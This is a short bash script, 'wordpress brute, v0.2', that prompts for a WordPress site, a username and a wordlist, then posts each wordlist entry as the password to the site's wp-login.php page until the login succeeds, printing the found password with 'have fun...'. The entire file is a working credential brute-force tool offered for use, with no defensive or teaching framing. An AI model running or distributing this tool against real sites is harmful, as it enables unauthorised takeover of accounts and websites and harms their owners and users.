#!/usr/bin/env bash 
# wordpress brute, v0.2 
 
echo "wordpress login cracker" 
echo 
echo "enter website with full path to wordpress: 
"; read site 
echo -n "enter wordpress user 
"; read user 
echo -n "enter wordlist path 
"; read wlpath 
 
n=`cat "$wlpath" | wc -l` 
for (( i=1; i <= $n; i++)); 
do 
#default user is admin 
password=`sed -n "$i"p "$wlpath"` 
b=`echo "log=$user&pwd=$password&wp-submit=Log+In&redirect_to=wp-admin" | lynx -dump -nolist -post_data ""$site"/wp-login.php" | grep ERROR` 
 
echo trying user $user with password $password 
 
if [ -z "$b" ] 
then 
 
echo "SUCCESS: "$site" password is: "$password"" 
echo "have fun..." 
exit 0 
fi 
done 
echo 
echo "brute force complete" 
echo "no password found :(" 

